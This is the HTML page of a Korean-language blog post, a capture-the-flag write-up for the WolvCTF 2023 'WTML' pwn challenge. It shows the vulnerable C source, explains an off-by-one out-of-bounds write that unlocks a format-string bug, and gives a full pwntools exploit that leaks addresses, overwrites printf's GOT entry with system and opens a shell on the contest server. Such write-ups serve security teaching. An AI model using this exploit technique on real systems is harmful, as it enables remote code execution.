@@ -1,0 +1,342 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1866   This cool intermediate service receives WTML bodies and replaces tags. How useful! Is it vulnerable?nc wtml.wolvctf.io 1337   [21 solves &#x2F; 489 points]  소스코드가 주어져">
+<meta property="og:type" content="article">
+<meta property="og:title" content="WolvCTF 2023 - WTML (pwn, oob)">
+<meta property="og:url" content="https://jiravvit.github.io/230322-wolvctf2023-WTML/index.html">
+<meta property="og:site_name" content="jir4vvit">
+<meta property="og:description" content="https:&#x2F;&#x2F;ctftime.org&#x2F;event&#x2F;1866   This cool intermediate service receives WTML bodies and replaces tags. How useful! Is it vulnerable?nc wtml.wolvctf.io 1337   [21 solves &#x2F; 489 points]  소스코드가 주어져">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-03-21T23:00:00.000Z">
+<meta property="article:modified_time" content="2023-03-29T15:37:16.483Z">
+<meta property="article:author" content="jir4vvit">
+<meta property="article:tag" content="medium">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/judi2.jpg">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/judi2.jpg" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/judi2.jpg">
+        
+      
+    
+    <!-- title -->
+    <title>WolvCTF 2023 - WTML (pwn, oob)</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/categories/">Category</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/230322-wolvctf2023-echo2/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/230321-wolvctf2023-childre/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/230322-wolvctf2023-WTML/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/230322-wolvctf2023-WTML/&text=WolvCTF 2023 - WTML (pwn, oob)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/230322-wolvctf2023-WTML/&title=WolvCTF 2023 - WTML (pwn, oob)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/230322-wolvctf2023-WTML/&is_video=false&description=WolvCTF 2023 - WTML (pwn, oob)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=WolvCTF 2023 - WTML (pwn, oob)&body=Check out this article: https://jiravvit.github.io/230322-wolvctf2023-WTML/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/230322-wolvctf2023-WTML/&title=WolvCTF 2023 - WTML (pwn, oob)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/230322-wolvctf2023-WTML/&title=WolvCTF 2023 - WTML (pwn, oob)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/230322-wolvctf2023-WTML/&title=WolvCTF 2023 - WTML (pwn, oob)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/230322-wolvctf2023-WTML/&title=WolvCTF 2023 - WTML (pwn, oob)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/230322-wolvctf2023-WTML/&name=WolvCTF 2023 - WTML (pwn, oob)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/230322-wolvctf2023-WTML/&t=WolvCTF 2023 - WTML (pwn, oob)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solve"><span class="toc-number">2.</span> <span class="toc-text">Solve</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">2.1.</span> <span class="toc-text">Exploit Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag"><span class="toc-number">2.2.</span> <span class="toc-text">Flag</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        WolvCTF 2023 - WTML (pwn, oob)
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">jir4vvit</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2023-03-21T23:00:00.000Z" itemprop="datePublished">2023-03-22</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/WriteUp/">WriteUp</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/medium/" rel="tag">medium</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <ul>
+<li><a target="_blank" rel="noopener" href="https://ctftime.org/event/1866">https://ctftime.org/event/1866</a></li>
+</ul>
+<blockquote>
+<p>This cool intermediate service receives WTML bodies and replaces tags. How useful! Is it vulnerable?<br><code>nc wtml.wolvctf.io 1337</code></p>
+</blockquote>
+<ul>
+<li>[21 solves &#x2F; 489 points]</li>
+</ul>
+<p>소스코드가 주어져 있고 길이도 짧아서 포너블 문제 중에 가장 먼저 손대봤다.</p>
+<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>소스코드가 주어져 있어서 소스코드위주로 분석했다.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MESSAGE_LEN 0x20</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">void</span> <span class="params">(*tag_replacer_func)</span><span class="params">(<span class="type">char</span> *message, <span class="type">char</span> from, <span class="type">char</span> to)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">tag_replacer</span> &#123;</span></span><br><span class="line">    <span class="type">uint8_t</span> id;</span><br><span class="line">    tag_replacer_func funcs[<span class="number">2</span>];</span><br><span class="line">&#125; __attribute__((packed)) tag_replacer;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">replace_tag_v1</span><span class="params">(<span class="type">char</span> *message, <span class="type">char</span> from, <span class="type">char</span> to)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> start_tag_index = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; MESSAGE_LEN - <span class="number">2</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (message[i] == <span class="string">&#x27;&lt;&#x27;</span> &amp;&amp; message[i + <span class="number">1</span>] == from &amp;&amp; message[i + <span class="number">2</span>] == <span class="string">&#x27;&gt;&#x27;</span>) &#123;</span><br><span class="line">            start_tag_index = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (start_tag_index == <span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = start_tag_index + <span class="number">3</span>; i &lt; MESSAGE_LEN; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (message[i] == <span class="string">&#x27;&lt;&#x27;</span> &amp;&amp; message[i + <span class="number">1</span>] == <span class="string">&#x27;/&#x27;</span> &amp;&amp; message[i + <span class="number">2</span>] == from) &#123;</span><br><span class="line">            <span class="type">size_t</span> end_tag_index = i;</span><br><span class="line">            message[start_tag_index + <span class="number">1</span>] = to;</span><br><span class="line">            message[end_tag_index + <span class="number">2</span>] = to;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">replace_tag_v2</span><span class="params">(<span class="type">char</span> *message, <span class="type">char</span> from, <span class="type">char</span> to)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[DEBUG] &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(message);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TODO implement</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Please provide feedback about v2: &quot;</span>);</span><br><span class="line">    <span class="type">char</span> response[<span class="number">0x100</span>];</span><br><span class="line">    fgets(response, <span class="keyword">sizeof</span>(response), <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Your respones: \&quot;&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(response);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\&quot; has been noted!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">prompt_tag</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *message, <span class="type">char</span> *tag)</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(message);</span><br><span class="line">    *tag = (<span class="type">char</span>) getchar();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (getchar() != <span class="string">&#x27;\n&#x27;</span> || *tag == <span class="string">&#x27;&lt;&#x27;</span> || *tag == <span class="string">&#x27;&gt;&#x27;</span>) <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    tag_replacer replacer = &#123;</span><br><span class="line">            .funcs = &#123;replace_tag_v1, replace_tag_v2&#125;,</span><br><span class="line">            .id = <span class="number">0</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">char</span> user_message[MESSAGE_LEN] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please enter your WTML!&quot;</span>);</span><br><span class="line">    fread(user_message, <span class="keyword">sizeof</span>(<span class="type">char</span>), MESSAGE_LEN, <span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">// Replace tag</span></span><br><span class="line">        <span class="type">char</span> from = <span class="number">0</span>;</span><br><span class="line">        prompt_tag(<span class="string">&quot;What tag would you like to replace [q to quit]?&quot;</span>, &amp;from);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (from == <span class="string">&#x27;q&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">char</span> to = <span class="number">0</span>;</span><br><span class="line">        prompt_tag(<span class="string">&quot;With what new tag?&quot;</span>, &amp;to);</span><br><span class="line"></span><br><span class="line">        replacer.funcs[replacer.id](user_message, from, to);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">puts</span>(user_message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>아래 부분을 유의있게 살펴보자.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">replacer.funcs[replacer.id](user_message, from, to);</span><br></pre></td></tr></table></figure>
+
+<p><code>replacer.id</code>는 0으로 초기화되어있고, 바로 입력할 수 있는 부분이 없기 때문에 겉으로 보기엔 <code>replace_tag_v1</code> 함수만 계속 실행된다. 하지만 <code>replace_tag_v2</code>에서 FSB가 발생하기 때문에 저 함수를 실행시켜야하는데 저 함수를 실행시키려면 <code>replacer.id</code>를 1로 세팅해야한다. 하지만 이걸 어떻게 세팅해야 할까? <code>main</code> 함수에서 흐름을 바꿀 취약점이 보이지 않는다.</p>
+<p><code>replace_tag_v1</code> 함수는 무조건 실행되니까 이 함수에서 취약점을 찾아서 <code>replace_tag_v2</code> 함수를 실행시켜 FSB를 트리거하는 방향으로 생각해야 한다.</p>
+<p><code>replace_tag_v1</code> 함수만 떼어놓고 분석해보자.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">replace_tag_v1</span><span class="params">(<span class="type">char</span> *message, <span class="type">char</span> from, <span class="type">char</span> to)</span> &#123;</span><br><span class="line">    <span class="type">size_t</span> start_tag_index = <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; MESSAGE_LEN - <span class="number">2</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (message[i] == <span class="string">&#x27;&lt;&#x27;</span> &amp;&amp; message[i + <span class="number">1</span>] == from &amp;&amp; message[i + <span class="number">2</span>] == <span class="string">&#x27;&gt;&#x27;</span>) &#123;</span><br><span class="line">            start_tag_index = i;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (start_tag_index == <span class="number">-1</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = start_tag_index + <span class="number">3</span>; i &lt; MESSAGE_LEN; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (message[i] == <span class="string">&#x27;&lt;&#x27;</span> &amp;&amp; message[i + <span class="number">1</span>] == <span class="string">&#x27;/&#x27;</span> &amp;&amp; message[i + <span class="number">2</span>] == from) &#123;</span><br><span class="line">            <span class="type">size_t</span> end_tag_index = i;</span><br><span class="line">            message[start_tag_index + <span class="number">1</span>] = to;</span><br><span class="line">            message[end_tag_index + <span class="number">2</span>] = to;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>MESSAGE_LEN</code>은 0x20으로 고정되어 있다. 참고로 <code>meesage</code>, <code>from</code>, <code>to</code> 모두 입력값이다. 첫 번째 반복문에서 <code>start_tag_index</code>는 <code>&lt;[from]&gt;</code>이 나오는, 즉 <code>&lt;</code>의 인덱스를 의미한다. 반복문을 볼 떄는 항상 반복문 조건의 인덱스 범위가 반복문 내부에서 사용하는 인덱스 범위를 넘어가지 않는지 항상 주시를 해야한다.</p>
+<p>두 번째 반복문에서는 <code>start_tag_index+3</code>, 즉 <code>&lt;[from]&gt;</code> 다음 인덱스부터 사용한다. 문제는 인덱스가 <code>MESSAGE_LEN-1</code> 일 때 <code>message[i+2]</code>에 접근한다. OOB가 발생한다. 사실 이거보다 더 중요한건 <code>message[end_tag_index + 2] = to;</code> 이 구문이다. 접근함에도 모자라 값을 쓰고 있다! 정확한 디버깅을 통해 저 부분이 <code>replacer.id</code>라면 1로 세팅해줄 수 있다.</p>
+<h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>FSB를 트리거할 수 있으면 익스플로잇은 간단하다. <code>pie base</code>와 <code>libc base</code>를 구한 다음에 <code>printf@got</code>를 <code>system</code>으로 덮고 입력을 조절할 수 있으므로 <code>/bin/sh\x00</code>를 보내면 끝이다!</p>
+<h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">p = remote(<span class="string">&#x27;wtml.wolvctf.io&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;&lt;&#x27;</span> + <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;&gt;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;ccccccccccccccccccccccccccc&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;&lt;/&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;WTML!\n&#x27;</span>, payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;quit]?\n&#x27;</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">## from</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;tag?\n&#x27;</span>, <span class="string">b&#x27;\x01&#x27;</span>) <span class="comment">## to</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;quit]?\n&#x27;</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">## from</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;tag?\n&#x27;</span>, <span class="string">b&#x27;\x01&#x27;</span>) <span class="comment">## to</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># offset 8</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (1)</span></span><br><span class="line"><span class="comment"># pie  24 -0x3520</span></span><br><span class="line"><span class="comment"># libc 13 -0x8ee8d</span></span><br><span class="line">payload = <span class="string">b&#x27;%13$p_%24$p&#x27;</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;v2:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x8ee8d</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;_0x&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recv(<span class="number">12</span>), <span class="number">16</span>) - <span class="number">0x3520</span></span><br><span class="line"></span><br><span class="line">info(<span class="built_in">hex</span>(libc.address))</span><br><span class="line">info(<span class="built_in">hex</span>(e.address))</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;quit]?\n&#x27;</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">## from</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;tag?\n&#x27;</span>, <span class="string">b&#x27;\x01&#x27;</span>) <span class="comment">## to</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># (2)</span></span><br><span class="line"><span class="comment"># printf@got -&gt; system</span></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += fmtstr_payload(<span class="number">8</span>, &#123;</span><br><span class="line">    e.got[<span class="string">&#x27;printf&#x27;</span>] : libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;v2:&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;quit]?\n&#x27;</span>, <span class="string">b&#x27;\x00&#x27;</span>) <span class="comment">## from</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;tag?\n&#x27;</span>, <span class="string">b&#x27;\x01&#x27;</span>) <span class="comment">## to</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &quot;Your respones: \&quot;&quot; =&gt; /bin/sh</span></span><br><span class="line">p.sendline(<span class="string">b&#x27;sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wctf&#123;0ff_by_0ne_@nd_y0ure_d0ne!!11!!&#125;</span><br></pre></td></tr></table></figure>
+
+  </div>
+</article>
+
+    <div class="blog-post-comments">
+        <div id="disqus_thread">
+            <noscript>Please enable JavaScript to view the comments.</noscript>
+        </div>
+    </div>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="/categories/">Category</a></li>
+         
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">1.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Solve"><span class="toc-number">2.</span> <span class="toc-text">Solve</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">2.1.</span> <span class="toc-text">Exploit Code</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flag"><span class="toc-number">2.2.</span> <span class="toc-text">Flag</span></a></li></ol></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/230322-wolvctf2023-WTML/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
